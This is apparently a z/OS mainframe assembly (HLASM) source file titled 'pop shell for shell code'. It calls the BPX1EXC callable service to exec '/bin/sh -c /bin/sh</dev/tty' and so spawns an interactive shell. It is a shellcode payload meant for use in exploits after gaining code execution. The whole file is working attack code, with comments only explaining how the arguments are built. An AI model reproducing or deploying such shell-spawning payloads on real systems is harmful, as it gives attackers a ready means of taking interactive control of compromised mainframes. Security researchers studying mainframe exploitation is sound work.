         TITLE  'pop shell for shell code'
NSHELL   CSECT  
NSHELL   AMODE 31
NSHELL   RMODE ANY
         ENTRY MAIN
MAIN     DS    0F
         STM   14,12,12(13)     # save our registers
         LARL  15,MAIN   
         LR    8,15
         USING MAIN,8        # give us some addressability
         LARL  11,SAVEAREA     # sa address
         ST    13,0(,11)       # save caller's save area
         LR    13,11     
         DS    0H
         BRAS  0,BEGIN  
FNAME    DC    C'BPX1EXC ' 
         DC    X'0'
BEGIN    LARL  0,FNAME
         XR    1,1
         SVC   8
         ST    0,GETENTRY      # GETENTRY addr of bpx1exc call
         L     15,GETENTRY
         LA    6,FULLARG       # FULLARG is arg stack for func call
         LR    1,6             # R1 has base of FULLARG for later call
***********************************************************************
*   What follows is the arguments for the BPX1EXC callable service    *
*   built like this for compaction of the code                        *
*   "args" refer to the args of the BPX1EXC call itself               *
*   "parms" refer to the parameters of the exec'd cmd (here /bin/sh)  *
*                                                                     *
***********************************************************************
         LA    7,PATHLEN
         ST    7,0(,6)         # store it's addr in first slot
         LA    7,PATH
         ST    7,4(,6)
         LA    7,ARGC
         ST    7,8(,6)
* list of addresses of parms lengths
         LA    7,ARGLL         # ARGLL - arg 4
         ST    7,12(,6)
* individual parms lengths 
         LA    9,ARG1L         # shell parm len 1
         ST    9,0(,7)         # store in length list slot 1
         LA    9,ARG2L         # arg2 len 2
         ST    9,4(,7)         # store in length list slot 2
         LA    9,ARG3L         # arg3 len 16
         ST    9,8(,7)         # store in length list slot 3
* list of addresses of parms
         LA    7,ARGLIST       # ARGLIST - arg 5
         ST    7,16(,6)
* individual parms
         LA    9,ARG1          # parm1 is null
         ST    9,0(,7)         
         LA    9,ARG2          # parm2 is "-c"
         ST    9,4(,7)       
         LA    9,ARG3          # parm3 ensures valid stdin
         ST    9,8(,7)      
*   0 is used for the last 8 args ENVC,ENVLL,ENVLIST,EXITADR,
*                                 EXITPGM,RTNVAL,RTNCODE,RSNCODE
         LA    7,ZERO
         ST    7,20(,6)
         ST    7,24(,6)
         ST    7,28(,6)
         ST    7,32(,6)
         ST    7,36(,6)
         ST    7,40(,6)
         ST    7,44(,6)
* for last arg need to add 0x80000000 (per asm callable svcs)
         XILF  7,X'80000000'
         ST    7,48(,6)
         AHI   6,4
GO       BALR  14,15 
* cleanup
         L     13,0(,11)
         LM    14,12,12(13)    # restore registers
         XR    15,15           # zero return code
         BCR   15,14           # branch to caller
         DS    0F              # constants area
GETENTRY DC    X'00000000'
SAVEAREA DC    X'00000000'
PATHLEN  DC    F'7'            # PATHLEN - arg 1
PATH     DC    C'/bin/sh'      # PATH - arg 2
ARGC     DC    F'3'            # ARGC - arg 3
ARG1     DC    XL1'0'
ARG2     DC    CL2'-c'
ARG3     DC    C'/bin/sh</dev/tty'
ARG1L    DC    F'1'
ARG2L    DC    F'2'
ARG3L    DC    F'16'
ZERO     DC    XL1'0'
* shell vars
FULLARG  DS    A
         DC    XL52'0'        # arg list here
ARGLL    DS    A
         DC    XL12'0'        # arg length addr here
ARGLIST  DS    A
         DC    XL12'0'        # arg length addr here
EOF      DC    X'deadbeef'
         END   MAIN
